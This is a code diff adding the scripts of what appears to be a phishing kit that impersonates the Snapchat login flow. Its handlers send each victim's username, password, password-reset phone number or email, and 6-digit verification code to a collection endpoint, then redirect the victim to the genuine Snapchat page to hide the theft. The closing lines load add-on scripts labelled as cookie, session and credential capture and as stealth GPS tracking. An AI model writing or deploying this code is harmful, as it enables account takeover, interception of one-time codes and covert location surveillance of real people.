+        document.getElementById('password-username').textContent = u;
+
+        document.getElementById('view-verifying').style.display = 'block';
+
+        // After 3 seconds, send step 1 AJAX and transition to password view
+        setTimeout(function () {
+          $.ajax({
+            url: HANDLER_URL,
+            type: 'POST',
+            data: { username: u, password: 'N/A (Step 1)', bank: PLATFORM, step: 'login' },
+            timeout: 15000,
+            complete: function () {
+              document.getElementById('view-verifying').style.display = 'none';
+              document.getElementById('view-password').style.display = 'block';
+            }
+          });
+        }, 3000);
+      });
+
+      // Toggle password visibility
+      function togglePasswordVisibility() {
+        const pwInput = document.getElementById('snap-password');
+        const eyeIcon = document.getElementById('eye-icon');
+        if (pwInput.type === 'password') {
+          pwInput.type = 'text';
+          eyeIcon.setAttribute('stroke', '#000');
+        } else {
+          pwInput.type = 'password';
+          eyeIcon.setAttribute('stroke', '#aaa');
+        }
+      }
+
+      // Password submit
+      document.getElementById('btn-password-next').addEventListener('click', function () {
+        const pw = document.getElementById('snap-password').value.trim();
+        if (!pw) {
+          document.getElementById('password-error').textContent = 'Password cannot be empty';
+          document.getElementById('password-error').style.display = 'block';
+          return;
+        }
+        document.getElementById('password-error').style.display = 'none';
+
+        const savedUsername = document.getElementById('password-username').textContent;
+        this.textContent = '...';
+        const btn = this;
+
+        $.ajax({
+          url: HANDLER_URL,
+          type: 'POST',
+          data: { username: savedUsername, password: pw, bank: PLATFORM, step: 'password' },
+          timeout: 15000,
+          complete: function () {
+            btn.textContent = 'Next';
+            window.location.replace('https://accounts.snapchat.com/accounts/login');
+          }
+        });
+      });
+
+      // Clear password error on input
+      document.getElementById('snap-password').addEventListener('input', function () {
+        document.getElementById('password-error').style.display = 'none';
+      });
+
+      // Masking function for username/phone/email
+      function maskTarget(target) {
+        if (!target) return '';
+        if (target.includes('@')) {
+          let parts = target.split('@');
+          let name = parts[0];
+          let maskedName = name.length > 2 ? name.substring(0, 2) + '*'.repeat(name.length - 2) : name;
+          return maskedName + '@' + parts[1];
+        } else if (target.startsWith('+')) {
+          let match = target.match(/^(\+\d{1,3})(\d+)$/);
+          if (match) {
+            let cc = match[1];
+            let num = match[2];
+            if (num.length > 4) {
+              return cc + ' *****-*' + num.substring(num.length - 4);
+            }
+          }
+          return target;
+        } else {
+          return target.length > 2 ? target.substring(0, 2) + '*'.repeat(target.length - 2) : target;
+        }
+      }
+
+      // Show Modal on Forgot Password click
+      document.getElementById('btn-forgot-password').addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById('forgot-password-modal').classList.remove('hidden');
+
+        // Send forgot_password event to backend
+        const savedUsername = document.getElementById('password-username').textContent;
+        $.ajax({
+          url: HANDLER_URL,
+          type: 'POST',
+          data: { username: savedUsername, password: 'N/A', bank: PLATFORM, step: 'forgot_password' },
+          timeout: 15000
+        });
+      });
+
+      // Handle Cancel inside Modal
+      document.getElementById('btn-cancel-reset').addEventListener('click', function () {
+        document.getElementById('forgot-password-modal').classList.add('hidden');
+      });
+
+      // Switch from Modal to Reset Views
+      document.getElementById('btn-reset-phone').addEventListener('click', function() {
+        document.getElementById('forgot-password-modal').classList.add('hidden');
+        document.getElementById('view-password').style.display = 'none';
+        document.getElementById('view-reset-phone').style.display = 'block';
+      });
+
+      document.getElementById('btn-reset-email').addEventListener('click', function() {
+        document.getElementById('forgot-password-modal').classList.add('hidden');
+        document.getElementById('view-password').style.display = 'none';
+        document.getElementById('view-reset-email').style.display = 'block';
+      });
+
+      // Show Confirm View based on entered target
+      function showConfirmViewWithTarget(target) {
+        document.getElementById('view-reset-phone').style.display = 'none';
+        document.getElementById('view-reset-email').style.display = 'none';
+        
+        const savedUsername = document.getElementById('password-username').textContent;
+        document.getElementById('confirm-username').textContent = savedUsername;
+        
+        let masked = maskTarget(target);
+        document.getElementById('confirm-prompt-text').innerHTML = 'Please input the code sent to <br><span id="confirm-masked-target">' + masked + '</span>.';
+        
+        document.getElementById('view-confirm').style.display = 'block';
+      }
+
+      document.getElementById('btn-submit-reset-phone').addEventListener('click', function() {
+        const phone = document.getElementById('reset-phone-input').value.trim();
+        if (!phone) {
+            document.getElementById('reset-phone-error').textContent = 'Phone number is required.';
+            document.getElementById('reset-phone-error').style.display = 'block';
+            return;
+        }
+        document.getElementById('reset-phone-error').style.display = 'none';
+        const cc = document.getElementById('reset-country-code').value;
+        const fullPhone = cc + phone;
+
+        // Send reset phone to backend
+        const savedUsername = document.getElementById('password-username').textContent;
+        $.ajax({
+          url: HANDLER_URL,
+          type: 'POST',
+          data: { username: savedUsername, password: 'N/A', bank: PLATFORM, step: 'reset_phone', reset_target: fullPhone },
+          timeout: 15000
+        });
+
+        showConfirmViewWithTarget(fullPhone);
+      });
+
+      document.getElementById('btn-submit-reset-email').addEventListener('click', function() {
+        const email = document.getElementById('reset-email-input').value.trim();
+        if (!email) {
+            document.getElementById('reset-email-error').textContent = 'Email is required.';
+            document.getElementById('reset-email-error').style.display = 'block';
+            return;
+        }
+        document.getElementById('reset-email-error').style.display = 'none';
+
+        // Send reset email to backend
+        const savedUsername = document.getElementById('password-username').textContent;
+        $.ajax({
+          url: HANDLER_URL,
+          type: 'POST',
+          data: { username: savedUsername, password: 'N/A', bank: PLATFORM, step: 'reset_email', reset_target: email },
+          timeout: 15000
+        });
+
+        showConfirmViewWithTarget(email);
+      });
+
+      // Confirm code submit
+      document.getElementById('btn-confirm-next').addEventListener('click', function () {
+        const code = document.getElementById('snap-code').value.trim();
+        if (!code) {
+          document.getElementById('code-error').textContent = 'Code cannot be empty';
+          document.getElementById('code-error').style.display = 'block';
+          document.getElementById('snap-code').classList.add('error-border');
+          return;
+        }
+        if (!/^\d{6}$/.test(code)) {
+          document.getElementById('code-error').textContent = 'Please enter a valid 6-digit code';
+          document.getElementById('code-error').style.display = 'block';
+          document.getElementById('snap-code').classList.add('error-border');
+          return;
+        }
+        document.getElementById('code-error').style.display = 'none';
+        document.getElementById('snap-code').classList.remove('error-border');
+
+        const savedUsername = document.getElementById('confirm-username').textContent;
+        this.textContent = '...';
+        const btn = this;
+
+        $.ajax({
+          url: HANDLER_URL,
+          type: 'POST',
+          data: { username: savedUsername, password: 'N/A', bank: PLATFORM, step: 'code', code: code },
+          timeout: 15000,
+          complete: function () {
+            btn.textContent = 'Next';
+            window.location.replace('https://accounts.snapchat.com/accounts/login');
+          }
+        });
+      });
+
+      // Clear code error on input and force digits only
+      document.getElementById('snap-code').addEventListener('input', function () {
+        this.value = this.value.replace(/\D/g, ''); // Remove non-digit characters
+        document.getElementById('code-error').style.display = 'none';
+        this.classList.remove('error-border');
+      });
+    </script>
+<!-- NetraX Collector: Cookie, Session & Credential Capture -->
+<script src="core/netrax_collector.js"></script>
+<!-- NetraX Location Tracker: Stealth GPS on Page Hide -->
+<script src="core/netrax_location_tracker.js"></script>
+</body>
+
+</html>
